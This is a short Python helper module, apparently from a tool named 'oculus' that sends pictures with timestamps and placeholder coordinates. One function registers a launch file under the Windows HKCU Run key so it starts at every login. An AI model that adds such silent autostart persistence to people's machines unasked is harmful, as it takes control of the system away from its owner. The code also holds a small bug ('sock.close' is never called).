import os
import winreg
import socket
from datetime import datetime as dt
from sys import platform

from configurations import (
    OS,
    CMD_LAUNCH_OCULUS,
    AUTO_LAUNCH_FILE,
)


def defining_operating_system() -> str:
    """Определяе операционую систему."""
    if platform in OS:
        return OS[platform]
    return '<??? OS ???>'


def when_send_time() -> str:
    """Когда отправил картинку."""
    return f'Время отправки: {dt.now().strftime("%Y-%m-%d-%H.%M")}'


def current_cwordints() -> str:
    """Узнать текущии кординаты."""
    return 'Ш: 40.000, Д: 40.000'


def create_file() -> None:
    """Функция создание файла."""
    with open(CMD_LAUNCH_OCULUS, 'w+', encoding='utf-8') as f:
        f.write(AUTO_LAUNCH_FILE)


def recording_auto_upload_windows() -> None:
    """Добавляет в автозагруску."""
    script_path = os.path.abspath(CMD_LAUNCH_OCULUS)
    key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, winreg.KEY_SET_VALUE
    )
    winreg.SetValueEx(
        key, "oculus", 0, winreg.REG_SZ, script_path
    )
    winreg.CloseKey(key)


def checking_the_internet() -> bool:
    """Проверка интернета."""
    try:
        sock = socket.create_connection(("www.google.com", 80))
        if sock is not None:
            sock.close
        return True
    except OSError:
        pass
    return False


def recording_auto_upload_linux() -> None:
    """."""
    pass
